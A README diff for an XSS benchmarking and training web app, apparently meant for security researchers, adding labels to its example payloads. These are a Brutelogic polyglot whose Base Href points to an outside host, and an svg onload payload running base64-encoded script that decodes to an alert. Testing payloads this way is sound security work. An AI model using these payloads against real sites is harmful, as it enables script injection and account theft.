@@ -4,7 +4,7 @@
 
 ## Objective
 
-**XSS Benchmark** is a web application designed to evaluate and benchmark the effectiveness of XSS (Cross-Site Scripting) payloads against a variety of real-world scenarios. It provides a structured environment for security researchers and developers to test, compare, and analyze payloads in different contexts, helping to improve web application security.
+**bXSS Benchmark** is a web application designed to evaluate and benchmark the effectiveness of XSS (Cross-Site Scripting) payloads against a variety of real-world scenarios. It provides a structured environment for security researchers and developers to test, compare, and analyze payloads in different contexts, helping to improve web application security.
 
 ---
 
@@ -12,9 +12,10 @@
 
 - **Scenario-Based Testing:** Test payloads against a curated set of XSS scenarios.
 - **Payload Management:** Add, edit, and manage XSS payloads.
-- **Automated and Headless Testing:** Run tests automatically or in headless mode for CI/CD integration.
+- **Automated and Headless Testing:** Run tests automatically in headless mode.
 - **Result Tracking:** View and analyze the effectiveness of payloads.
 - **Extensible:** Easily add new scenarios via YAML files.
+- **Training:** Practice your xss skills in different contexts.
 
 ---
 
@@ -50,8 +51,10 @@ go to webapp, in the home page add your payload and run a benchmark.
 Payloads examples:
 
 ```html 
+Brutelogic bxss
 JavaScript://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/</Style/</Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus= /*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 
+Basic bxss
 "><svg/onload=eval(atob('YWxlcnQoImJ4c3MiKQ=='))>// 
 
 ```
